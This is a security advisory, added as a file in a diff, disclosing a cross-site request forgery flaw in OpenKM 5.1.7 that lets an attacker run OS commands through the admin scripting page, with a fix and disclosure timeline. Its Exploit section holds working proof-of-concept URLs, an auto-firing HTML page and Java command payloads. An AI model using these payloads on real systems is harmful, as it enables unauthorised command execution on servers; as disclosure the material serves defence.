@@ -1,0 +1,142 @@
+########################################################################
+##
+#
+# COMPASS SECURITY ADVISORY http://www.csnc.ch/ 
+########################################################################
+##
+#
+# ID:      COMPASS-2012-002
+# Product: OpenKM Document Management System 5.1.7 [1]
+# Vendor:  OpenKM http://www.openkm.com/
+# Subject: Cross-site Request Forgery based OS Command Execution
+# Risk:    High
+# Effect:  Remotely exploitable
+# Author:  Cyrill Brunschwiler (cyrill.brunschwiler@csnc.ch)
+# Date:    January 2nd 2012
+#
+########################################################################
+##
+
+Description:
+------------
+Cyrill Brunschwiler, Security Analyst at Compass Security Network
+Computing,
+Switzerland discovered a web application issue based OS command
+execution flaw
+in the OpenKM solution. OpenKM does allow administrative users (having
+the
+AdminRole) to run bean shell scripts. Due to the flaw, an attacker could
+lure
+an OpenKM administrator to a malicious web page that causes arbitrary OS
+commands being run in the administrators OpenKM session context. This is
+possible because OpenKM does not implement access control mechanisms to
+avoid
+so called Cross-site Request Forgery [2] (a.k.a. CSRF, XSRF, session
+riding,
+forceful browsing). The commands are being executed silently. In the
+end, this
+allows an attacker to run OS commands with the privileges of the process
+owner
+of the application server (JBOSS).
+
+Vulnerable:
+-----------
+OpenKM version 5.1.7
+
+Not vulnerable:
+---------------
+OpenKM version 5.1.8
+
+Fix:
+----
+To avoid this issue the application must introduce Anti-XSRF tokens for
+the
+web-based administrative interface. To avoid arbitrary command execution
+the
+admin/scripting.jsp could be removed from the OpenKM.ear before the
+application is being deployed. Note, the cron job functionality allows
+to run
+*.jar and BeanShell scripts as well.
+
+Exploit:
+--------
+Login as administrator (having the AdminRole) and call the URL in a
+different
+browser window
+http://example.com/OpenKM/admin/scripting.jsp?script=String%5B%5D+cmd+%3
+D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3E+%2Ftmp%
+2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B
+
+Alternatively the administrator could browse a prepared HTML page in a
+new tab
+<html>
+<body>
+<script>
+img = new Image();
+img.src="http://example.com/OpenKM/admin/scripting.jsp?script=String%5B%
+5D+cmd+%3D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3
+E+%2Ftmp%2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B"
+</script>
+</body>
+</html>
+
+The above exploit does nothing else than just creating a file in /tmp
+
+String[] cmd = {"/bin/sh", "-c", "/bin/echo pwned > /tmp/poc"};
+Runtime.getRuntime().exec(cmd);
+
+Some might also want to browse directories
+http://example.com/OpenKM/admin/scripting.jsp?script=import+java.io.*%3B
+%0D%0A%0D%0Atry+%7B%0D%0A++++String+ls_str%3B%0D%0A++++Process+ls_proc+%
+3D+Runtime.getRuntime%28%29.exec%28%22%2Fbin%2Fls+-lah%22%29%3B%0D%0A+++
++DataInputStream+ls_in+%3D+new+DataInputStream%28ls_proc.getInputStream%
+28%29%29%3B%0D%0A%0D%0A++++while+%28%28ls_str+%3D+ls_in.readLine%28%29%2
+9+%21%3D+null%29+++++++++++%0D%0A++++++++print%28ls_str+%2B+%22%3Cbr%3E%
+22%29%3B%0D%0A%0D%0A%7D+catch+%28IOException+e%29+%7B%0D%0A%7D
+
+import java.io.*;
+
+try {
+    String ls_str;
+    Process ls_proc = Runtime.getRuntime().exec("/bin/ls -lah");
+    DataInputStream ls_in = new
+DataInputStream(ls_proc.getInputStream());
+
+    while ((ls_str = ls_in.readLine()) != null)           
+        print(ls_str + "<br>");
+
+} catch (IOException e) {
+}
+
+Timeline:
+---------
+August 6th, Vulnerability discovered
+August 9th, Vendor contacted
+August 10th, Vendor notified
+December 1st, Patched version released
+January 2nd, Advisory released
+
+References:
+-----------
+[1] OpenKM http://www.openkm.com/
+is an Free/Libre document management system that provides a web
+interface for
+managing arbitrary files. OpenKM includes a content repository, Lucene
+indexing, and jBPM workflow. The OpenKM system was developed using Java
+technology.
+
+[2] Cross-site Request Forgery
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+CSRF is an attack which forces an end user to execute unwanted actions
+on a
+web application in which he/she is currently authenticated. With a
+little help
+of social engineering (like sending a link via email/chat), an attacker
+may
+force the users of a web application to execute actions of the
+attacker's
+choosing. A successful CSRF exploit can compromise end user data and
+operation
+in case of normal user. If the targeted end user is the administrator
+account,
+this can compromise the entire web application.
